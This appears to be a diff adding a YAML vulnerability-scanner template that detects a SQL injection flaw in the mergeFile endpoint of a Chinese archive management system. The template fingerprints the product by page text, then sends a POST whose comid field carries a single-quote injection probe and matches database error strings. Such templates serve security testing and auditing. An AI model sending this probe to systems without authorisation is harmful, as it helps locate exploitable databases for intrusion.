@@ -1,0 +1,38 @@
+id: poc-yaml-th-ams-mergefile-sqli
+info:
+  name: 紫光档案管理系统 mergeFile SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in 紫光档案管理系统 mergeFile functionality.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "紫光档案管理系统"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/Archive/ErecordManage/mergeFile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      userID=admin&fondsid=1&comid=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "SQL信息"
+          - "errorSql"
+          - "Rest db"
